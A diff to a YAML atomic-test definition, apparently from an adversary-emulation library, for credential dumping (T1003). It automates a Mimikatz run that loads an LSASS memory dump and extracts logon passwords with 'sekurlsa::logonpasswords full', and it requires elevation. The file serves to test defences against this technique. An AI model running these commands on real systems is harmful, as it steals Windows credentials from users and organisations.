@@ -137,22 +137,20 @@ atomic_tests:
     - windows
 
   input_arguments:
+    mimikatz_binary_path:
+      description: Path of the Mimikatz binary
+      type: string
+      default: $PathToAtomicsFolder\T1003\bin\mimikatz.exe
     input_file:
-      description: Path where resulting dump should be placed
+      description: Path of the Lsass dump
       type: Path
-      default: lsass_dump.dmp
+      default: C:\Windows\Temp\lsass_dump.dmp
 
   executor:
-    name: manual
-    steps: |
-      1. Open Mimikatz:
-        Execute `mimikatz` at a command prompt.
-
-      2. Select a Memory Dump:
-        Within the Mimikatz interactive shell, execute `sekurlsa::minidump #{input_file}`
-
-      3. Obtain Credentials:
-        Within the Mimikatz interactive shell, execute `sekurlsa::logonpasswords full`
+    name: command_prompt
+    elevation_required: true
+    command: |
+      #{mimikatz_binary_path} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
 
 - name: Dump Active Directory Database with NTDSUtil
   description: |
